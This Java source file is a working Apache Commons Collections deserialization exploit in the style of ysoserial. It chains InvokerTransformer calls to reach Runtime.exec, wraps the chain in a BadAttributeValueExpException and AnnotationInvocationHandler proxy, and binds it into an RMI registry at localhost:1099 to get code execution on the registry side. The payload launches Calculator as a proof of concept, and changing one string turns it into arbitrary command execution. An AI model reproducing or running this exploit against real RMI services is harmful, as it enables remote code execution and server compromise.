import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.*;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class PayloadYsoserial {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map ouputMap = LazyMap.decorate(innerMap,transformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap,"pwn");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        try {
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            Map tmpMap = new HashMap();
            tmpMap.put("pwn",badAttributeValueExpException);
            Constructor<?> ctor = null;
            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            ctor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,tmpMap);

            Remote remote = Remote.class.cast(Proxy.newProxyInstance(PayloadYsoserial.class.getClassLoader(), new Class[] {Remote.class}, invocationHandler));
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            registry.bind("pwn",remote);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
